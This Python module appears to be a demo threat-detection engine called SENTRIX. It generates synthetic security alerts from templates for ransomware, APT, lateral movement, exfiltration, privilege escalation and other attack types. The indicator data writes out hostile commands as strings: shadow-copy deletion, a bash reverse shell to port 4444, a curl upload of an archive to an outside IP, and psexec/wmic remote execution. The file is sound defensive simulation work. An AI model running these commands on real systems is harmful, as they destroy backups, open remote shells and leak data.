"""
SENTRIX — Threat Detection Engine
===================================
Simulates real-time monitoring of network traffic, host processes,
and file-system activity.  In a production deployment this module would
interface with SIEMs, EDR agents, and network taps.  Here it uses a rich
library of realistic synthetic attack scenarios so the system can be run
and demonstrated without live infrastructure.
"""
from __future__ import annotations
import random
import uuid
from datetime import datetime
from typing import List, Optional

from .models import (
    AttackType, AssetCriticality, DetectionEvent,
    NetworkIndicator, ProcessIndicator, FileIndicator,
)


# ──────────────────────────────────────────────────────────────────────────────
#  Scenario library  (realistic templates the generator can expand)
# ──────────────────────────────────────────────────────────────────────────────

_SCENARIO_TEMPLATES = {
    AttackType.RANSOMWARE: {
        "asset_criticality": AssetCriticality.HIGH,
        "network": [
            NetworkIndicator("10.0.1.45", "185.220.101.33", 443, "TLS", 12_400, 89, 0.88),
            NetworkIndicator("10.0.1.45", "185.220.101.33", 8443, "TLS", 3_100, 22,  0.82),
        ],
        "processes": [
            ProcessIndicator(4821, "vssadmin.exe", "cmd.exe",
                             "vssadmin delete shadows /all /quiet",
                             "SYSTEM", 12.4, 18.2, 0.97),
            ProcessIndicator(4822, "cipher.exe", "malware.exe",
                             "cipher /w:C:\\",
                             "SYSTEM", 44.1, 64.8, 0.95),
        ],
        "files": [
            FileIndicator("C:\\Users\\Admin\\Documents\\report.pdf.locked", "encrypted", 7.92, False, 0.98),
            FileIndicator("C:\\Users\\Admin\\Desktop\\README_DECRYPT.txt",  "created",   1.10, False, 0.90),
            FileIndicator("C:\\Windows\\Temp\\crypt_payload.exe",           "created",   7.88, True,  0.99),
        ],
        "log": (
            "2026-10-18 03:14:55 WARN  ProcessCreate pid=4821 img=vssadmin.exe parent=cmd.exe\n"
            "2026-10-18 03:14:57 CRIT  FileModify   path=C:\\...\\report.pdf (entropy=7.92)\n"
            "2026-10-18 03:14:58 CRIT  NetConn      dst=185.220.101.33:443 bytes=12400"
        ),
    },
    AttackType.APT: {
        "asset_criticality": AssetCriticality.CRITICAL,
        "network": [
            NetworkIndicator("10.0.3.12", "45.142.212.100", 80,  "HTTP", 890,    12, 0.72),
            NetworkIndicator("10.0.3.12", "45.142.212.100", 443, "TLS",  240_000, 1820, 0.85),
        ],
        "processes": [
            ProcessIndicator(1337, "powershell.exe", "svchost.exe",
                             "powershell -enc JABjAGwAaQBlAG4AdA...",
                             "NT AUTHORITY\\SYSTEM", 3.2, 22.1, 0.91),
            ProcessIndicator(1338, "rundll32.exe", "powershell.exe",
                             "rundll32.exe C:\\Temp\\beacon.dll,Start",
                             "NT AUTHORITY\\SYSTEM", 1.1, 11.4, 0.89),
        ],
        "files": [
            FileIndicator("C:\\Windows\\System32\\Tasks\\WindowsUpdate_Cron", "created", 4.20, False, 0.85),
            FileIndicator("C:\\Temp\\beacon.dll",                              "created", 7.70, True,  0.96),
        ],
        "log": (
            "2026-10-18 01:00:00 INFO  Logon    user=svchost type=network src=45.142.212.100\n"
            "2026-10-18 01:00:05 WARN  TaskCreate name=WindowsUpdate_Cron\n"
            "2026-10-18 01:00:10 CRIT  DNSQuery  fqdn=c2.apt-infra.net answer=45.142.212.100"
        ),
    },
    AttackType.LATERAL_MOVEMENT: {
        "asset_criticality": AssetCriticality.HIGH,
        "network": [
            NetworkIndicator("10.0.2.88", "10.0.2.1",   445, "SMB", 18_300, 420, 0.79),
            NetworkIndicator("10.0.2.88", "10.0.2.200", 445, "SMB",  8_900, 210, 0.76),
            NetworkIndicator("10.0.2.88", "10.0.2.55",  135, "MSRPC",1_100,  44, 0.71),
        ],
        "processes": [
            ProcessIndicator(3210, "wmic.exe", "cmd.exe",
                             "wmic /node:10.0.2.200 process call create 'cmd /c ...'",
                             "Domain Admin", 2.2, 8.9, 0.88),
            ProcessIndicator(3211, "psexec.exe", "cmd.exe",
                             "psexec \\\\10.0.2.55 -u admin -p *** cmd",
                             "Domain Admin", 1.8, 7.1, 0.87),
        ],
        "files": [
            FileIndicator("C:\\Windows\\Temp\\psexec.exe", "created", 6.10, True,  0.82),
        ],
        "log": (
            "2026-10-18 04:32:10 WARN  SMBConnect   src=10.0.2.88 dst=10.0.2.200\n"
            "2026-10-18 04:32:12 WARN  ProcessCreate remote pid=3210 img=wmic.exe\n"
            "2026-10-18 04:32:15 WARN  SMBConnect   src=10.0.2.88 dst=10.0.2.55"
        ),
    },
    AttackType.DATA_EXFILTRATION: {
        "asset_criticality": AssetCriticality.CRITICAL,
        "network": [
            NetworkIndicator("10.0.5.9", "203.0.113.50", 443, "TLS",  985_000, 720, 0.93),
            NetworkIndicator("10.0.5.9", "203.0.113.50", 53,  "DNS",   42_000, 980, 0.88),
        ],
        "processes": [
            ProcessIndicator(7700, "7za.exe", "python.exe",
                             "7za a -tzip -p*** archive.zip C:\\Data\\*",
                             "dbadmin", 55.3, 180.2, 0.90),
            ProcessIndicator(7701, "curl.exe", "python.exe",
                             "curl -T archive.zip https://203.0.113.50/upload",
                             "dbadmin", 22.1, 40.0, 0.91),
        ],
        "files": [
            FileIndicator("C:\\Temp\\archive.zip",                 "created",  7.95, False, 0.88),
            FileIndicator("C:\\Data\\customers_export_2026.csv",   "accessed", 1.05, False, 0.85),
        ],
        "log": (
            "2026-10-18 22:10:01 WARN  FileAccess   path=C:\\Data\\customers_export_2026.csv\n"
            "2026-10-18 22:10:08 CRIT  NetConn      dst=203.0.113.50:443 bytes=985000\n"
            "2026-10-18 22:10:09 CRIT  DNSTunnel    domain=exfil.attacker.io queries=980"
        ),
    },
    AttackType.PRIVILEGE_ESCALATION: {
        "asset_criticality": AssetCriticality.MEDIUM,
        "network": [
            NetworkIndicator("192.168.1.22", "192.168.1.1", 4444, "TCP", 2_200, 18, 0.74),
        ],
        "processes": [
            ProcessIndicator(2020, "exploit.exe", "bash",
                             "./exploit.exe --cve 2024-1234 --shell /bin/bash",
                             "www-data", 88.1, 55.3, 0.95),
            ProcessIndicator(2021, "bash", "exploit.exe",
                             "bash -i >& /dev/tcp/192.168.1.1/4444 0>&1",
                             "root", 0.5, 4.2, 0.97),
        ],
        "files": [
            FileIndicator("/tmp/exploit.elf",         "created", 7.44, True,  0.94),
            FileIndicator("/etc/passwd",               "modified", 3.20, False, 0.92),
        ],
        "log": (
            "2026-10-17 12:05:22 WARN  ExecveCall   path=/tmp/exploit.elf user=www-data\n"
            "2026-10-17 12:05:23 CRIT  PrivEsc      uid changed 33→0\n"
            "2026-10-17 12:05:24 CRIT  NetConn      dst=192.168.1.1:4444 proto=TCP"
        ),
    },
    AttackType.DDOS: {
        "asset_criticality": AssetCriticality.HIGH,
        "network": [
            NetworkIndicator("0.0.0.0", "10.0.0.10", 80,  "HTTP", 4_500_000, 95_000, 0.99),
            NetworkIndicator("0.0.0.0", "10.0.0.10", 443, "TLS",  1_200_000, 28_000, 0.97),
        ],
        "processes": [
            ProcessIndicator(1, "nginx", "systemd",
                             "nginx -g 'daemon off;'",
                             "www-data", 99.9, 512.0, 0.85),
        ],
        "files": [],
        "log": (
            "2026-10-18 08:00:01 CRIT  RateLimit    src=0.0.0.0/0 rps=95000 dst=10.0.0.10:80\n"
            "2026-10-18 08:00:01 CRIT  SynFlood     half-open=84220\n"
            "2026-10-18 08:00:02 WARN  ServiceDeg   latency=12400ms (normal=42ms)"
        ),
    },
    AttackType.ZERO_DAY: {
        "asset_criticality": AssetCriticality.CRITICAL,
        "network": [
            NetworkIndicator("172.16.4.8", "10.1.0.5", 8080, "HTTP", 14_800, 210, 0.94),
        ],
        "processes": [
            ProcessIndicator(9001, "java", "tomcat",
                             "java -jar /tmp/.hidden_payload.jar",
                             "tomcat", 61.2, 320.4, 0.97),
        ],
        "files": [
            FileIndicator("/tmp/.hidden_payload.jar", "created", 7.80, True,  0.98),
            FileIndicator("/opt/tomcat/webapps/ROOT/shell.jsp", "created", 6.55, False, 0.96),
        ],
        "log": (
            "2026-10-18 15:44:09 CRIT  WebRequest   src=172.16.4.8 uri=/cgi-bin/<?php ...\n"
            "2026-10-18 15:44:10 CRIT  ProcessSpawn parent=tomcat child=java args=payload.jar\n"
            "2026-10-18 15:44:11 CRIT  FileCreate   path=/opt/tomcat/webapps/ROOT/shell.jsp"
        ),
    },
    AttackType.MALWARE: {
        "asset_criticality": AssetCriticality.MEDIUM,
        "network": [
            NetworkIndicator("10.0.6.14", "91.108.4.100", 8000, "HTTP", 3_300, 42, 0.81),
        ],
        "processes": [
            ProcessIndicator(5500, "svchost32.exe", "explorer.exe",
                             "C:\\Windows\\Temp\\svchost32.exe --persist",
                             "User", 18.4, 44.1, 0.88),
        ],
        "files": [
            FileIndicator("C:\\Windows\\Temp\\svchost32.exe",            "created",  7.60, True,  0.90),
            FileIndicator("HKCU\\Software\\Microsoft\\Windows\\Run\\upd", "modified", 2.10, False, 0.85),
        ],
        "log": (
            "2026-10-18 09:30:05 WARN  RegMod       key=HKCU\\...\\Run val=svchost32.exe\n"
            "2026-10-18 09:30:06 WARN  ProcessCreate img=svchost32.exe parent=explorer\n"
            "2026-10-18 09:30:08 WARN  NetConn       dst=91.108.4.100:8000"
        ),
    },
    AttackType.INSIDER_THREAT: {
        "asset_criticality": AssetCriticality.HIGH,
        "network": [
            NetworkIndicator("10.0.1.99", "8.8.8.8", 80, "HTTP", 220_000, 310, 0.70),
        ],
        "processes": [
            ProcessIndicator(4400, "robocopy.exe", "cmd.exe",
                             "robocopy C:\\Secrets E:\\USB\\backup /E /NFL",
                             "jsmith", 22.0, 30.1, 0.75),
        ],
        "files": [
            FileIndicator("C:\\Secrets\\HR_Salaries_2026.xlsx", "accessed", 1.05, False, 0.72),
            FileIndicator("E:\\USB\\backup\\HR_Salaries_2026.xlsx", "created", 1.05, False, 0.68),
        ],
        "log": (
            "2026-10-18 18:00:00 WARN  USB_Mount    device=SanDisk user=jsmith\n"
            "2026-10-18 18:00:02 WARN  FileAccess   path=C:\\Secrets\\HR_Salaries_2026.xlsx\n"
            "2026-10-18 18:00:05 WARN  FileCopy     dst=E:\\USB\\backup\\"
        ),
    },
    AttackType.PHISHING: {
        "asset_criticality": AssetCriticality.MEDIUM,
        "network": [
            NetworkIndicator("10.0.4.77", "62.122.184.55", 443, "TLS", 1_100, 18, 0.76),
        ],
        "processes": [
            ProcessIndicator(6600, "chrome.exe", "outlook.exe",
                             "chrome.exe --load-extension=C:\\Temp\\ext",
                             "mbrown", 14.2, 120.0, 0.80),
        ],
        "files": [
            FileIndicator("C:\\Users\\mbrown\\Downloads\\invoice.pdf.exe", "created", 7.20, True,  0.88),
            FileIndicator("C:\\Temp\\ext\\background.js",                   "created", 3.40, False, 0.74),
        ],
        "log": (
            "2026-10-18 10:14:33 WARN  EmailClick   url=http://phish.evil.com/login\n"
            "2026-10-18 10:14:40 WARN  FileDownload path=invoice.pdf.exe\n"
            "2026-10-18 10:14:41 WARN  ProcessCreate img=invoice.pdf.exe parent=chrome"
        ),
    },
}

# Human-readable asset names per criticality
_ASSET_NAMES: Dict[AssetCriticality, List[str]] = {
    AssetCriticality.CRITICAL: [
        "DC-PROD-01 (Primary Domain Controller)",
        "DB-PROD-03 (Customer Database Cluster)",
        "FIN-SRV-01 (Financial Transaction Server)",
        "VAULT-01 (Password Vault & PKI)",
    ],
    AssetCriticality.HIGH: [
        "APP-SRV-07 (Core Web Application)",
        "HR-SRV-02 (HR & Payroll System)",
        "ERP-NODE-4 (Enterprise Resource Planning)",
        "BACKUP-NAS (Primary Backup Storage)",
    ],
    AssetCriticality.MEDIUM: [
        "WS-DEV-14 (Developer Workstation)",
        "PRINT-SRV-1 (Print & Scan Server)",
        "INTERN-WS-3 (Intern Workstation)",
        "TEST-SRV-2 (QA / Testing Server)",
    ],
    AssetCriticality.LOW: [
        "LOBBY-PC-01 (Reception Terminal)",
        "CONF-ROOM-TV (Conference Display)",
    ],
}

from typing import Dict   # noqa: E402 (already imported above, just for clarity)


class ThreatDetector:
    """
    Monitors the environment and emits DetectionEvent objects.

    Parameters
    ----------
    seed : int, optional
        Fix the random seed for reproducible demos.
    """

    def __init__(self, seed: Optional[int] = None):
        if seed is not None:
            random.seed(seed)

    # ── Public API ───────────────────────────────────────────────────────────

    def detect(self, attack_type: Optional[AttackType] = None) -> DetectionEvent:
        """
        Produce a DetectionEvent for the given attack type.
        If attack_type is None a random scenario is selected.
        """
        if attack_type is None:
            attack_type = random.choice(list(AttackType))

        tpl = _SCENARIO_TEMPLATES[attack_type]

        criticality: AssetCriticality = tpl["asset_criticality"]
        asset_name = random.choice(_ASSET_NAMES[criticality])
        asset_id   = f"ASSET-{uuid.uuid4().hex[:6].upper()}"
        event_id   = f"EVT-{uuid.uuid4().hex[:8].upper()}"

        # Add a small amount of jitter to anomaly scores so repeated runs vary
        def jitter(score: float) -> float:
            return min(1.0, max(0.0, score + random.uniform(-0.04, 0.04)))

        net_iocs = [
            NetworkIndicator(
                n.source_ip, n.dest_ip, n.port, n.protocol,
                n.bytes_sent, n.packets, jitter(n.anomaly_score)
            )
            for n in tpl["network"]
        ]
        proc_iocs = [
            ProcessIndicator(
                p.pid, p.name, p.parent_name, p.command_line,
                p.user, p.cpu_pct, p.mem_mb, jitter(p.anomaly_score)
            )
            for p in tpl["processes"]
        ]
        file_iocs = [
            FileIndicator(
                f.path, f.action, f.entropy,
                f.is_executable, jitter(f.anomaly_score)
            )
            for f in tpl["files"]
        ]

        return DetectionEvent(
            event_id           = event_id,
            timestamp          = datetime.now(),
            asset_id           = asset_id,
            asset_name         = asset_name,
            asset_criticality  = criticality,
            attack_type        = attack_type,
            network_indicators = net_iocs,
            process_indicators = proc_iocs,
            file_indicators    = file_iocs,
            raw_log_snippet    = tpl["log"],
        )

    def scan_all(self) -> List[DetectionEvent]:
        """Return one DetectionEvent per known attack type (useful for demos)."""
        return [self.detect(at) for at in AttackType]
